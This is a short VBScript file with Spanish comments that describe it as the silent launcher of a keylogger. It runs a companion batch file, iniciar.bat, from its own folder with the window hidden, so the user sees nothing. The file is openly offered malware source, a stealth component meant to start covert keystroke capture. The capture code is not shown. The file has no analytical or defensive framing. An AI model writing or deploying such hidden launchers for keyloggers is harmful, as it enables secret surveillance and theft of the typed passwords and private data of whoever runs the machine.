' iniciar.vbs - Lanzador silencioso del keylogger.
' Ejecuta iniciar.bat sin mostrar ninguna ventana.
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName) & "\iniciar.bat" & Chr(34), 0, False
